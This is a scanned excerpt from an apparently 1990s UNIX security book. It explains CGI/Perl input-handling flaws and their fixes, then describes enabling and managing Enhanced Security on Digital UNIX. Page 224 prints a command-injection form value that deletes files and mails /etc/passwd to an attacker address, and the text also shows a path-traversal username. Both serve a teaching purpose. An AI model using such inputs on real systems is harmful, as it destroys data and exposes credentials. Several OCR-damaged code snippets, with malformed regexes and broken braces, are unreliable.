- pgno: 224
  md: 'with the form’s message written to a temp file mailed to Jane Steak. A few
    days after the system administrator installs this script in the cgi-bin directory,
    she finds that hackers have broken into the system and compromised valuable files,
    all thanks to Jane’s script. How? Imagine that the hacker has set up a Web page
    on his end like the following.


    ```

    <HTML><body>

    <h1>Hacking beef.com!</h1>

    <form action="http://www.beef.com/CGI-bin/doit.pl" method = "get">

    <input type="hidden" name="myaddress" value="; rm * ;mail -s Haha hacker@bacon.com
    </etc/passwd;">

    <input type = "text" name=input>

    <input type = "submit" value="Hack Away!">

    </form>

    ```


    The semicolons in the hidden value field act as delimiters, which separate UNIX
    commands, enabling several to be executed on the same line in a shell. The system
    call in Perl spawns a UNIX shell and, in this case, executes the commands in the
    value field, removing the current files in the directory and mailing the password
    file to the hacker.


    The first lesson here is that user input to a CGI script can never be trusted.
    The second lesson is to avoid using system calls promiscuously in Perl, or any
    language for that matter.


    # Other System Call Holes


    Any CGI system call is inherently dangerous if not coded correctly. Consider the
    following line of Perl code. (Remember, Perl backticks follow shell conventions
    — that is, a UNIX subshell is spawned with the quoted string as the command line,
    and the output of that command becomes the argument for the Perl command.)


    ```

    print `/usr/local/bin/finger $userinput`;

    ```


    This could be taken advantage of by using the same malicious user input as before.
    In general, none of the following metacharacters belong in user input.


    ```

    ; > < & * ` | $ #

    ```'
  merge: -1
  img_proc: true
- pgno: 225
  md: "The following is a sample Perl code snippet to check for these characters.\n\
    \n```\nif ($userinput =~ /[;\\|<>*&&\\|\\]/) { #match any characters\n    print\
    \ \"<h1>CGI ERROR: What are you doing!<\\/h1>\";\n    #print an error\nelse {\n\
    \    print `/usr/local/bin/finger $userinput`\n    #proceed normally\n}\n```\n\
    \nFor an e-mail address form entry, you could designate a safe domain-style e-mail\
    \ format in Perl, as in the following example. (Note the example doesn’t take\
    \ into consideration UUCP addresses.)\n\n```\nunless ($userinput =~ /[\\w@\\.-]+$/)\
    \ {\n    #if does not match email format\n    print \"<h1>CGI ERROR: Enter a valid\
    \ EMAIL address<\\/h1>\";\n    #print an error\nelse {\n    print `/usr/local/bin/finger\
    \ $userinput` #proceed normally\n}\n```\n\nIn Perl, you can also perform system\
    \ calls with the backticks used in the previous example, or with the eval statement.\
    \ Consider the following alternatives to those system calls. For e-mail purposes,\
    \ use the following.\n\n```\nopen (MAIL, \"| /usr/lib/sendmail -t -n\");\nprint\
    \ MAIL << END_OF_MESSAGE\nFrom: $from_input\nTo: $to_input\nSubject: $subject_input\n\
    \n$message_input\nEND_OF_MESSAGE\n```\n\nThis example opens a piped process to\
    \ sendmail, thereby avoiding the dangers of user input with the system call.\n\
    \nUnder system and exec commands, there is an option that enables you to call\
    \ external programs directly rather than calling a shell. Listing your arguments\
    \ in the following manner prevents the UNIX shell from being spawned, which prevents\
    \ metacharacters from having unwanted side effects, and neutralizes any shell\
    \ vulnerabilities."
  merge: -1
  img_proc: true
- pgno: 226
  md: '```

    system "/usr/bin/finger",$userinput

    exec "/bin/ping",$ping_argument,$ping_host

    ```


    Here is the general form of another example of a piped process that prevents shell
    vulnerabilities.


    ```

    open(Filehandle_name, ''|-'' ) || exec "program", $arg1, $arg2;

    ```


    By using the mystical code sequence |-, you can fork a copy of Perl and open a
    pipe to that copy, which will execute the program designated by exec. Notice the
    program list in the same format mentioned in the previous example. The following
    example illustrates this program list format.


    ```

    open(FIND,"|-") || exec "/usr/bin/find",".","-name",$name,"-print";

    while (<FIND>) |

    print "found: $_";

    |

    close FIND;

    ```


    This script searches the system for an input variable $name and prints all occurrences
    of it. It successfully avoids spawning a UNIX shell, thereby improving performance
    and tightening security. For more detailed Perl alternatives to system calls,
    read the WWW security FAQ section on safe scripting.


    # Opening Files


    Imagine you are writing a program that stores a message based on the username
    of the user entering it. You add the following line of code to your script.


    ```

    open(FILE,">/usr/local/message/data/$username");

    ```


    What if the user typed in ../../../../etc/passwd as his username? You could have
    a serious problem. Always check for the .. when opening any type of file handle.


    # Taint Checks: A Useful Tool


    Perl has a very practical option for handling unsafe user variables. Consider
    that most of the vulnerabilities in CGI result from user input passed to your
    script. Imagine also that every outside variable passed to your program is tainted
    and that the taint can spread to other parts of the system like a contagious disease.
    Perl taint checks prevent any tainted variables from being used with the system,
    eval, exec, and backtick commands, or any other type of action that affects the
    outside system environment. Perl will exit the script with an error message if
    it detects such an attempt.'
  merge: -1
  img_proc: true
- pgno: 227
  md: 'To invoke taint checking in Perl v4, the first line of your script should read


    ```

    #!/usr/local/bin/taintperl

    ```


    This will load a special version of the interpreter. In Perl v5, you can invoke
    taint checks with the -T option. For example,


    ```

    #!/usr/local/bin/perl -T

    ```


    (If you''re not sure which version of Perl you have, type perl -v.)


    Once the user has passed his or her e-mail address into your script, you should
    untaint that variable. A variable can become untainted only when pattern matching
    is performed on it. Only after you have extracted the intended string from your
    variable, can you now use it normally. For example, to untaint an e-mail address
    (example taken from the WWW security FAQ), use the following.


    ```

    $mail_address =~ /([\w.]+@[\w.-]+)/;

    $untainted_address = $1;

    ```


    You must include one more thing when performing taint checks. Because the Perl
    interpreter does not take the environment path for granted, you must define it,
    even if your program does not interact with a shell. Be sure to include the following
    line in your code or you will get an error complaining about insecure paths.


    ```

    $ENV{''PATH''} = ''/usr/bin:/usr/local/bin:/bin'';

    ```


    A favorite hacker''s trick is to subvert your environment variables to point to
    a Trojan horse in another directory. Thus, you should always specify the full
    path of commands when using the system call. Compare the two following examples
    for clarification.


    ```

    system("finger $untainted_user"); #This is bad. Avoid.

    system("/usr/local/bin/finger $untainted_user"); #This is better.

    ```'
  merge: -1
  img_proc: true
- pgno: 228
  md: '# The Dreaded Autobackup


    Be careful when editing your CGI scripts in the actual cgi-bin directory. Some
    editors, such as EMACS, create a backup file with an extension of ~ if you edit
    the original. If a potential intruder somehow guesses the file password.pl is
    backed up as password.pl~, he will be able to view the actual code of the backup
    program since the server does not recognize the extension .pl~. Upon viewing the
    backup file as plain text, the intruder could possibly exploit the original CGI
    program by scanning the code for vulnerabilities. Be on the lookout for any suspicious
    types of extensions in your cgi-bin directory.


    # Some Other Odds and Ends


    In terms of what to include in your scripts and cgi-bin directory, you should
    try not to give out too much information about your server. For example, the finger
    command is a convenient perk, but it can divulge important things, such as home
    directories or mail forwarding paths, to a possible snooper. In terms of the binaries
    and scripts contained in your cgi-bin directory, you should scrutinize these files
    at regular intervals.


    Don''t place any valuable information in the cgi-bin directory. If your cgi-bin
    contains the query binary, it can be used quite insidiously by a browser to search
    for specific files (like /etc/passwd). query ships with most versions of NSCA
    and Apache, so a little housekeeping may be necessary. Commands like query and
    finger may be nice bells and whistles for your system, but in the long run, you
    will be much happier with those types of executables disabled. Also, never be
    tricked into putting a copy of Perl (or any interpreter for that matter) in your
    cgi-bin directory. This fatal error allows any arbitrary commands to be run by
    anyone with a browser and malicious intent.


    You should also avoid enabling your scripts to run as another user. A program
    called cgiwrap (http://www.umn.edu/~cgiwrap by Nathan Neulinger) allows this practice,
    but increases the security risks in CGI. Enabling a script to run as a user other
    than the Web server''s UID allows write access to that user''s home directory
    and puts their files at great peril. rm -rf * is only a few keystrokes away!


    You should check the contents of the cgi-bin directory periodically, especially
    if privileged users are constantly editing their scripts. A quick scan of their
    code could save you grief in the long run.'
  merge: -1
  img_proc: true
- pgno: 229
  md: '# Suggestions


    Most Web administrators eventually deal with CGI security, but only after the
    damage from an attack or intrusion has occurred. Today, the general Internet public
    is more educated about the Web, and CGI vulnerabilities are often discussed in
    mass mailings and newsgroups. Thus, the system administrator must ever be on the
    lookout for the latest known security holes and common attack methods. To prevent
    action on these widely known holes, it is obviously important to patch them as
    quickly as possible.


    As an administrator, you have probably seen the sort of scripting mistakes to
    be aware of and search for in your server''s CGI directory. The installation tips
    provided here will also help circumvent the type of attacks and loss of private
    data that CGI allows. CGI can become a constant threat if the proper policies
    and concrete scripting procedures are not instituted. Coordinate with the Webmaster
    (and other CGI programmers) to discuss the risks involved, educate the CGI authors,
    and keep abreast of security news by subscribing to mailing lists like the one
    maintained by CERT (http://www.cert.org).


    Web servers act as one of the only external access points for many companies and
    organizations, making them prime targets on the Internet. The CGI is a double-edged
    sword that can enable hostile attacks against these systems. By remaining aware
    of the possible threats of CGI, you can better protect your own Web site from
    vandalism, destruction, and information theft.


    # References


    +   Gundavaram, Shishir. *CGI Programming on the World Wide Web*. Sebastopol,
    CA: O''Reilly, 1996.

    +   Schwartz, Randal. *Learning Perl*. Sebastopol, CA: O''Reilly, 1993.

    +   Schwartz, Randal. *Programming Perl*. Sebastopol, CA: O''Reilly, 1991.

    +   Schwartz, Randal (with Larry Wall). *Perl 5*. Sebastopol, CA: O''Reilly, 1996.

    +   http://perl.com for information on Perl.

    +   Phillips, Paul. CGI Security FAQ. cert.net: http://www.cerf.net/~paul/CGI-security/safe-cgi.txt

    +   http://www.cert.org for information on CERT.

    +   Stein, Lincoln. WWW Security FAQ. http://www-genome.wi.mit.edu/WWW/faqs/www-security-faq.html

    +   www-security-requests@ns2.rutgers.edu for a WWW Security e-mail list. Send
    an e-mail with the body "subscribe".

    +   http://hoohoo.ncsa.uiuc.edu/ and http://hoohoo.ncsa.uiuc.edu/cgi/security.html
    for NCSA documentation.

    +   http://www.apache.org for Apache documentation.'
  merge: -1
  img_proc: true
- pgno: 230
  md: '# Enhanced Security

    on Digital UNIX


    # Matthew Cheek


    This chapter describes the benefits and management of Enhanced Security (or C2
    Security) on Digital UNIX. Other UNIX vendors, notably SCO and HP, implement Enhanced
    Security similarly to Digital, and most of these concepts and strategies apply
    to their operating systems. However, I will use Digital UNIX v3.0 and above (including
    v4.0) to demonstrate how Enhanced Security can enhance your ability to manage
    Digital UNIX (DU) systems.


    One of the first things I discovered after being introduced to DU (formerly OSF/1)
    was the lack of shadow passwords in the default security configuration. Having
    shadow passwords means moving the encrypted password from the world-readable /etc/passwd
    file to a root-only readable file. I consider shadow passwords a necessity, given
    the general availability of cracking tools that compare the encrypted password
    string with a dictionary of encrypted words looking for a match.


    After consulting the system and security administration manuals about this, I
    found that there are actually two levels of security under DU: Base Security and
    Enhanced Security.'
  merge: -1
  img_proc: true
- pgno: 231
  md: 'Base Security is the default security level with traditional UNIX passwords.
    Enhanced Security provides a rich set of Password and Login controls and extensive
    Auditing features. The Password controls include the shadow passwords feature,
    configurable password length (both minimum and maximum), and password usage history.
    The Login controls provide per terminal settings for delays between consecutive
    successful or failed login attempts, the ability to retire or lock accounts, and
    logging of the last successful login and unsuccessful login attempt. The Audit
    features include per user audit profiles, extensive site-definable event auditing,
    and the ability to send audit logs to a remote host.


    Some DU systems have Base Security enabled because of the perceived complexity
    and limited understanding of the features of Enhanced Security. However, corporate
    security requirements for shadow passwords and password aging necessitated enabling
    Enhanced Security on my systems. Unfortunately, Enhanced Security is not well
    documented, and was met with some apprehension by the system administration staff
    and user communities. Because of these concerns, I decided to enable Enhanced
    Security on a test system, work through the implementation and management issues,
    and document the process.


    # Enabling Enhanced Security


    Assume that you are setting up Enhanced Security on a running system with existing
    user accounts. This procedure would be similar if you were enabling Enhanced Security
    on a newly installed system with no user accounts.


    You must first choose the global defaults for the Password and Login controls
    of Enhanced Security. These system-wide global defaults reside in /etc/auth/system/default
    and provide values for users and devices. Determine and record the settings that
    make the most sense for your environment. (See the sidebar "System Default Database
    File Format" for field definitions and suggested values.)


    Once you have selected values for the system defaults, you can begin enabling
    Enhanced Security, following these steps.


    +   1. Log in as root.

    +   2. Install the Enhanced Security subsets, if not already installed.

    +   3. Run the secsetup utility and select the ENHANCED security level.

    +   4. Reboot the system.

    +   5. Adjust the System Default Database file to reflect desired global defaults.

    +   6. Remove hashed passwords from the /etc/passwd file.

    +   7. Test your applications.


    Obviously, to enable Enhanced Security, you must have the ability and opportunity
    to reboot your system. Coordinate a time that is convenient with your users to
    avoid disrupting their work.


    The following sections provide detailed instructions for enabling Enhanced Security.'
  merge: -1
  img_proc: true
- pgno: 232
  md: '# System Default Database File Format


    The global configuration file for Enhanced Security on DU is /etc/auth/system/default
    and defines values for users at a system-wide level. An administrator planning
    to implement Enhanced Security must be familiar with the values specified in this
    file in order to configure Enhanced Security appropriately for his or her system.
    The following is a default file I will use as an example of a relaxed security
    configuration. To avoid frustration in the initial implementation, I recommend
    that Enhanced Security be enabled with most options either loose or disabled altogether.
    Once you are more familiar with Enhanced Security, tighten down the option that
    makes the most sense for your environment.


    ```

    default:

    :d_name=default:\

    :d_secclass=c2:\

    :d_boot_authenticate@:\

    :d_pw_expire_warning=8640000:\

    :d_pw_site_callout=/tcb/bin/pwpolicy:\

    :u_mnchg@0:u_minlen=8:u_maxlen=12:u_exp=0:\

    :u_life@0:u_pickpw:u_genpw:@u_restrict:\

    :u_pwddepth=0:u_nullpw:@u_genchars@u_genletters@:\

    :u_maxtries=0:u_lock@:\

    :t_logdelay=2:t_maxtries=10:\

    :chkent:

    ```


    The default file consists of options in a single, continuous entry that can be
    broken into multiple lines with a backslash (\). Each option is preceded and followed
    by a colon (:). If the entry is broken into multiple lines, a colon and a backslash
    (:) are required at the end of each line, and each continuation line must be indented
    by a tab and begin with a colon.


    Options can have numeric, Boolean, or string values. Numeric options have the
    format name=num. Boolean options have the format name=name@name@, in which the
    first form indicates the option is TRUE and the second form indicates the option
    is FALSE. String options have the format name=string, in which string is zero
    or more characters.


    At the end of the entry is the :chkent field, which indicates that the entry is
    complete. This field is used as an integrity check on the entry by the programs
    that read the file.


    The following text describes the meanings of the example options.


    default This first option is simply the header that specifies the name of file
    for this security database and is required.


    d_name This option specifies the name of this security database and should not
    be changed from the string default.


    d_secclass This option is an informational identifier of the security classes
    supported by the system and should be set to c2.


    d_boot_authenticate This option is not currently used by Enhanced Security.'
  merge: -1
  img_proc: true
- pgno: 233
  md: '# Log In as root


    This process can be done either while logged in directly as root from the system
    console or while logged in from a terminal or across the network as a regular,
    non-privileged user su ed to root. Check that Enhanced Security is not already
    enabled with the following command.


    ```

    # /usr/sbin/rcmgr get SECURITY

    ```


    If the string BASE is returned, you are running Base Security. If, however, the
    string ENHANCED is returned, Enhanced Security is already enabled on this system,
    and you should jump to Step 5 (the section "Adjust System Default Database") to
    adjust the global defaults.


    # System Default Database File Format — continued


    d_pw_expire_warning This option, in seconds, is used to determine whether a password
    expiration warning is given at login time. If the password expiration for a user
    falls within this time interval, a warning is given.


    d_pw_site_callout This option specifies the full pathname of the script to call
    for site-specific security policy conformance decisions. The /etc/bin/pwpolicy
    by default does nothing but exit with a positive return code. See the "DEC OSF/1
    Security" manual for more information on this option.


    u_minchg#0 This option specifies the minimum time between password changes in
    seconds. If the value assigned is zero (0), there is no minimum time enforced.


    u_minlen#8 This option specifies the minimum password length.


    u_maxlen#12 This option specifies the maximum password length.


    u_exp#0 This option specifies the number of seconds after a successful password
    change that the account password will expire. If the values specified is zero
    (0), passwords will not expire.'
  merge: -1
  img_proc: true
- pgno: 234
  md: '# Install the Enhanced Security Subsets


    Before you can enable Enhanced Security, two Enhanced Security Software Subsets
    must be loaded. These subsets are named OSF C2SECxxx and OSF XC2SECxxx. (The xxx
    specifies the version of the subset.) To determine whether these subsets are loaded,
    you can check as shown by the following command and output.


    ```

    # /usr/sbin/setld -i | grep -i c2sec

    OSFC2SEC350 installed C2-Security (System Administration)

    OSFXC2SEC350 installed C2-Security GUI (System Administration)

    ```


    In this example, both subsets are installed. If you do not receive any output
    or if the installed keyword is absent, you must install both subsets from the
    master operating system install media using the setld command. For assistance,
    see the "Installation Guide" for your revision of the operating system.


    # System Default Database File Format — continued


    u_pwdepth#0 This option specifies the number of old encrypted passwords to save
    to prevent reuse. A value of zero (0) indicates that old passwords can be reused.


    u_nullpw@ This Boolean option controls the ability of a user to choose a null
    password. A u_nullpw entry indicates a null password can be chosen; a u_nullpw@
    indicates that it cannot.


    u_genchars@ This Boolean option controls the ability of a user to generate random
    characters for a password. A u_genchars entry indicates that the user can generate
    passwords made up of random characters; a u_genchars@ entry indicates that she
    cannot.


    u_genletters@ This Boolean option controls the ability of a user to generate random
    letters for a password. A u_genletters entry indicates that the user can generate
    passwords made up of random letters; a u_genletters@ entry indicates that he cannot.


    u_maxtries#0 This option specifies the maximum number of consecutive unsuccessful
    login attempts to an account before the account is locked. Setting this option
    to zero (0) disables the locking of accounts due to unsuccessful login attempts.


    u_lock@ This Boolean option is used to administratively lock an account. A u_lock
    entry indicates that the account is locked; a u_lock@ entry indicates that it
    is not. The presence of the u_lock@ entry in the Default Database File is to globally
    indicate that all accounts are unlocked unless locked in the individual Protected
    Password Database Files.


    t_logdelay#2 This option specifies the number of seconds between unsuccessful
    login attempts. This field is designed to slow the rate at which login attempts
    on a terminal device can occur.


    t_maxtries#10 This option specifies the maximum number of consecutive unsuccessful
    login attempts permitted using the terminal before the terminal is locked. Once
    the terminal is locked, it must be unlocked by an authorized administrator. For
    additional information, see the manpage for default(4).'
  merge: -1
  img_proc: true
- pgno: 235
  md: '# Run the secsetup Utility


    The secsetup utility is an interactive program with toggles between Base and Enhanced
    Security on DU systems. You must be prepared to answer the following questions,
    in addition to selecting which System Security Level you desire.


    +   - Do you wish to disable segment sharing?

    +   - Do you wish to run the audit setup utility at this time?


    Typically, the answer to both of these questions is NO unless you have special
    requirements. See the DEC OSF/1 Security manual for more information on these
    options.


    The following shows an example secsetup session with the security level being
    changed from Base to Enhanced.


    ```

    # /usr/sbin/secsetup

    Enter system security level {BASE ENHANCED ?}[ENHANCED]: <RETURN>

    ENHANCED security level will take effect on the next system reboot.

    Do you wish to disable segment sharing?(yes no ?)[no]: <RETURN>

    Do you wish to run the audit setup utility at this time?(yes no ?)[no]: <RETURN>

    Press return to continue: <RETURN>

    #

    ```


    Note that default answers to each prompt are in square brackets and can be selected
    by simply pressing the Return key.


    # Reboot the System to Enable Enhanced Security


    Before the new security level change takes effect, the system must be rebooted.
    The following command is a simple way to accomplish this.


    ```

    # /sbin/shutdown -r +2 "System being rebooted to enable Enhanced Security."

    ```


    This shuts down and reboots the system with two minutes grace time and displays
    an informative message to any logged-in users.


    # Adjust System Default Database File


    Once the system has successfully rebooted, log in as root and make the previously
    recorded adjustments to the System Default Database File, as follows.


    ```

    # cd /etc/auth/system

    # cp default default.orig

    # vi default (and apply desired changes)

    ```'
  merge: -1
  img_proc: true
- pgno: 236
  md: "# Remove Encrypted Password Strings from /etc/passwd\n\nThe secsetup utility\
    \ has copied the encrypted passwords from the password field of /etc/passwd into\
    \ the individual user security databases under the /tcb/files/auth hierarchy.\
    \ However, secsetup does not remove the encrypted passwords from /etc/passwd.\
    \ When Enhanced Security is installed on your system, the password field should\
    \ contain an asterisk (*), as the encrypted password is no longer stored in /etc/passwd.\
    \ A small Korn shell script that safely removes the encrypted password string\
    \ from the password field of /etc/passwd and replaces it with an asterisk is shown\
    \ in Listing 18.1.\n\n# Listing 18.1 remove_passwd.ksh — a Korn shell script to\
    \ replace the encrypted password string from the password field of /etc/passwd\
    \ with an asterisk.\n\n```\n#!/bin/ksh\n# Short script to replace the encrypted\
    \ password\n# strings in /etc/passwd with an asterisk (*)\n\nif test ! -w /etc/passwd\n\
    then\n    print 'Please su to root first.'\n    exit 1\nfi\n\ntrap 'rm -rf /etc/ptmp\
    \ ; exit 1' 1 2\n\nif [[ `rcmgr get SECURITY` = BASE ]]\nthen\n    print 'Security\
    \ Level is not ENHANCED.'\n    exit 1\nfi\n\nif mkdir /etc/ptmp\nthen\n    :\n\
    else\n    print 'The /etc/passwd file is busy. Try again later.'\n    exit 1\n\
    fi\n```"
  merge: -1
  img_proc: true
- pgno: 237
  md: "# Test Your Application\n\nAt this point, your system is running Enhanced Security\
    \ and you should test your applications as appropriate before declaring success.\
    \ Before your users attempt to log in and perhaps run afoul of the system, note\
    \ that if any user’s password under Base security was longer than eight characters,\
    \ only the first eight characters will now be accepted as valid. For example,\
    \ if a password was toogood2be, the user must enter only toogood2 to successfully\
    \ log in. When the user changes his or her password under Enhanced Security, the\
    \ global or user defaults, if different, will dictate the password length. Make\
    \ sure your users are aware of this password issue before they log into the newly\
    \ Enhanced Security-enabled system.\n\n# Listing 18.1 (continued)\n\n```\nawk\
    \ 'FS=\"=\", OFS=\"=\" {print $1,\"**\",$3,$4,$5,$6,$7}' /etc/passwd > \\\n/etc/ptmp/passwd.modified\n\
    \ncp /etc/ptmp/passwd.modified /etc/passwd\n\nif [ -f /etc/passwd.pag -o -f /etc/passwd.dir\
    \ ]\nthen\n    print 'Rebuilding the password database...'\n    ( cd /etc ; mkpasswd\
    \ passwd )\nelse\n    print 'The hashed password database does not exist.'\n \
    \   print -n 'Do you want to create it [y]/n? '\n    if read y\n    then\n   \
    \     case \"$y\" in\n            in [yY]* ) print 'Rebuilding the password data\
    \ base...'\n                        ( cd /etc ; mkpasswd passwd ) ;;\n       \
    \ esac\n    fi\nfi\n\nrm -rf /etc/ptmp\nprint 'Successfully replaced encrypted\
    \ passwords with asterisks'\nexit 0\n```"
  merge: -1
  img_proc: true
- pgno: 238
  md: '# Disabling Enhanced Security


    If you find it necessary to disable Enhanced Security and return to Base Security,
    the steps are as follows.


    +   1. Log in as root.

    +   2. Run the secsetup utility and select the BASE security level.

    +   3. Reboot the system.


    This will quickly revert the system back to Base Security and copy the encrypted
    passwords from the /tcb/files/auth hierarchy into the /etc/passwd file. Rebooting
    the system completes the process. This will leave all the Enhanced Security files
    (/etc/auth/* and /tcb/files/*) in place if you decide to re-enable Enhanced Security.


    # Account Management


    A primary responsibility of a UNIX system administrator is user account management.
    This includes account creation, account modification, and account removal. Once
    Enhanced Security is enabled on a DU system, new utilities are provided and should
    be used whenever possible to manage user accounts. The two primary tools, XSysAdmin
    and XI sso, are both X Window applications. Unfortunately, Digital has not provided
    a character cell interface to accomplish the same functionality. However, account
    management can also be performed without running these GUIs, which may occasionally
    be necessary. Additionally, both XSysAdmin and XI sso will be replaced after the
    v4.0 release of DU with the single program dxaccounts, the new Common Desktop
    Environment (CDE) account management tool. Since both XSysAdmin and XI sso still
    work in v4.0 and all earlier releases of DU, I will use them for my examples.


    # XSysAdmin


    This program''s role is to create new user accounts, create new groups, modify
    the new user account template, and retire user accounts.


    New accounts are created by filling out a dialog box with necessary information,
    such as the account name, home directory, desired shell, etc. New accounts are
    created without passwords. Use the passwd command to set a password for the account
    after creating the account. New accounts are also created in a locked state. Use
    the XI sso command to unlock the accounts.'
  merge: -1
  img_proc: true
- pgno: 239
  md: 'Account creation can also still be accomplished with the Base Security command
    adduser. This command is mostly Enhanced Security-aware, with one exception: the
    string Nologin is inserted in the password field of the /etc/passwd file, rather
    than an asterisk. This does not prevent the user account from being used, since
    the password field of the /etc/passwd file is completely ignored when the security
    level is ENHANCED. However, I find this inconsistency confusing, so I manually
    edit the /etc/passwd file (via the viwp command) to correct it. You could also
    run the remove passwd script (Listing 18.1) again after adding accounts with adduser
    to clean up this minor wrinkle.


    I strongly recommend that you create accounts on DU systems with either the XSysAdmin
    program or the adduser command unless you have a thorough understanding of all
    the details of the security database files.


    Creation of new groups is accomplished by specifying the group name and GID in
    the XSysAdmin New Group dialog box. Optionally, the Base Security command addgroup
    can be used to create new groups or the /etc/group file can be manually edited
    by the superuser to add a new group. XSysAdmin is also used to edit the new user
    account template, which specifies the default account parameters used when a new
    account is created. These parameters include password length, account expiration
    date, time of day restrictions, etc. These parameters are only the defaults and
    can be overridden on a per account basis. The parameters are actually stored in
    the System Default Database File, /etc/auth/system/default, and can be manually
    edited by the superuser.


    Finally, the XSysAdmin program is used to retire user accounts. Retiring a user
    account, rather than simply deleting it, is a requirement of C2 Security to which
    DU with Enhanced Security conforms. Retiring an account permanently locks the
    account and prevents reuse of that account''s UID. Once an account is retired,
    that account can not be reenabled.


    The Base Security command removeuser will completely remove all traces of an account.
    If the stringent account retirement requirements of C2 Security are not necessary,
    the removeuser command can continue to be used to remove user accounts.


    # XIsso


    This program is used to modify existing user accounts and to edit system security
    defaults.


    Existing account characteristics can be changed via the Modify User Accounts dialog
    box of the XIsso program. You can specify the groups to which the account belongs,
    the login parameters, and the password parameters. These parameters are stored
    in the protected password database files that reside under /tcb/files/auth. This
    hierarchy has, underneath it, subdirectories with single letter names, each of
    which is an initial letter for account names. Each file in these subdirectories
    contains a protected password entry for a single user account, and the filenames
    are the same as'
  merge: -1
  img_proc: true
- pgno: 240
  md: 'the user account names. For example, the protected password file for root is
    /tcb/files/auth/r/root. These files can be manually edited by the superuser. (See
    the sidebar "Protected Password Authentication Database File Format" for format
    and field definitions.)


    Xisoo also allows the system administrator to set the global system parameters
    of Inactivity Timeout and Account Expiration Warning. The Inactivity Timeout is
    the number of minutes that a logged in account can remain idle before the session
    is closed. If a value of 0 minutes is specified, no inactivity timeout is enabled
    and account sessions will not be terminated. The Account Expiration Warning parameter
    specifies the number of days prior to an account''s expiration that warning messages
    will be shown to the user at login. These parameters are universal and cannot
    be set on a per-user basis. Both of these parameters (d_inactivity_timeout and
    d_pw_expire_warning) are stored in the System Default Database File, /etc/auth/system/default,
    and can be manually added or edited by the superuser.


    # Protected Password Authentication Database File Format


    An authentication file is maintained for each user account on an Enhanced Security-enabled
    system. These files are located under /tcb/files/auth, which is accessible only
    to the superuser. The encrypted password string, among other things, is stored
    in this file. Options specified in an individual account Protected Password file
    override any Global settings specified in the System Default file. The following
    is an example Protected Password file on a system running Enhanced Security.


    ```

    mcheek:u_name=mcheek:u_id#247:u_oldcrypt#0:\n:u_pwd=1o2A5Adx3oXm:\n:u_succhg#82891924:u_unsucchg#829276329:\n:u_sucLog#839193127:u_suctty=ttypl:\n:u_unsucLog#836691522:u_unsuctty=ttypl:u_lock#:\n:chkent:

    ```


    The format for this file is identical to the format for the System Default file.
    The following text describes the meanings of the example options.


    mcheek This first option is simply the header that specifies the name of file
    for this security database and is required.


    u_name=mcheek This option specifies the username for the account and must match
    the username in a corresponding /etc/password entry.


    u_id#247 This option specifies the UID for the account and must match the UID
    in a corresponding /etc/password entry.


    u_oldcrypt#0 This option specifies the algorithm number used to encrypt the current
    password.


    u_pwd=1o2A5Adx3oXm This option specifies the encrypted password string for the
    account. (This is not an actual password.)'
  merge: -1
  img_proc: true
- pgno: 241
  md: '# Network Information Service


    Another aspect of account management under Enhanced Security is the Network Information
    Service (NIS). NIS is a distributed system used to centralize the management of
    a common set of system and network files, such as the password, group, and host
    files. NIS allows the system administrator to manage these shared files from a
    single server. NIS supports both Enhanced and Base Security on Digital and non-Digital
    machines. I do not manage any NIS systems, so I leave it as an exercise for the
    reader to determine the issues of implementing Enhanced Security in an NIS environment.


    # Enhanced Security Logging


    One unique feature of DU is a consolidated security authentication mechanism called
    the Security Integration Architecture (SIA). This SIA layer isolates the security-related
    commands (e.g., login, su, and passwd) from the specific security mechanisms that
    include, in addition to Base and Enhanced Security, optional products like


    # Protected Password Authentication Database File Format — continued


    u_succchg#828918424 This option specifies the time of the last successful password
    change. The time is specified as the number of seconds since the Epoch, 00:00:00
    GMT 1 Jan 1970. Obviously, this time value is not immediately useful, and in fact,
    this field should only be set by programs (such as passwd(1)) that can be used
    to change the account password.


    u_unsuccchg#8299276329 This option specifies the time of the last unsuccessful
    password change. This field should not be manually edited.


    u_succlog#839193127 This option specifies the time of the last successful login.
    This field should not be manually edited.


    u_suctty=tty1 This option specifies the name of the terminal associated with the
    last successful login to the account.


    u_unsuclog#838691522 This option specifies the time of the last unsuccessful login.
    This field should not be manually edited.


    u_unsuctty=tty1 This option specifies the name of the terminal associated with
    the last unsuccessful login to the account.


    u_lock@ This Boolean option is used to administratively lock an account. A u_lock
    entry indicates that the account is locked; a u_lock@ entry indicates that it
    is not.


    For additional information, see the manpage for prpasswd(4).'
  merge: -1
  img_proc: true
- pgno: 242
  md: 'DCE. You do not need to be concerned with this SIA layer, except to take advantage
    of the centralized logging the SIA provides via the sialog file. This log will
    record all security events, including the success and failure results of login,
    password changes, and su. With this single logfile, I do not have to monitor multiple
    logs. To enable the sialog, simply create the logfile with the following command.


    ```

    # touch /var/adm/sialog

    ```


    The log can then be written to by the SIA. The recommended permissions for the
    sialog are 600. Typically, you would want to prevent non-privileged users from
    viewing the contents of security logs like sialog, because there is the possibility
    of passwords appearing in the log. An excerpt from the sialog shows the types
    of events recorded.


    ```

    SIA:EVENT Wed Jun 5 05:22:08 1996

    Successful session authentication for mcheek on :0

    SIA:EVENT Wed Jun 5 05:22:08 1996

    Successful establishment of session

    SIA:ERROR Wed Jun 5 05:24:11 1996

    Failure on authentication for su from mcheek to root

    SIA:EVENT Wed Jun 5 05:24:40 1996

    Successful authentication for su from root to mcheek

    SIA:Wed Jun 5 05:25:46 1996

    Successful password change for mcheek

    ```


    This log will continue to grow without bounds, so it must be manually truncated
    periodically. To stop logging of SIA events, remove the logfile. Since the SIA
    is part of the DU operating system, the sialog can be used with either Base or
    Enhanced Security.


    # Application Issues


    System administrators are typically responsible for installation and configuration
    of commercial (off-the-shelf) software. Before enabling Enhanced Security, you
    must ensure that any applications currently installed are Enhanced Security-aware.
    Relational Database Management Systems, like Oracle or Informix, that can be configured
    to rely on the operating system for user authentication may be affected by Enhanced
    Security. If such an application were not aware of Enhanced Security, user authentication
    into the application would most likely fail. If the application vendor does not
    know whether Enhanced Security will affect its product, implement Enhanced Security
    slowly and test the application as much as possible before going to production.'
  merge: -1
  img_proc: true
- pgno: 243
  md: 'You may also have to support software development efforts for both in-house
    and commercial applications. Coordinate the implementation of Enhanced Security
    with any software developers you support on your system, and refer to the DEC
    OSF/1 Security manual’s section “Programmer’s Guide to Security” for details.


    A final software issue is the freely available software typically obtained from
    the Internet. There are many security-related tools and utilities available that
    may or may not support Enhanced Security. I have successfully installed sudo (maintained
    at the University of Colorado) and wuarchive-ftpd (Washington University FTP Server)
    on DU Enhanced Security systems.


    sudo is a useful utility that allows the superuser to give certain users or groups
    of users the ability to run some or all commands as root while logging all commands
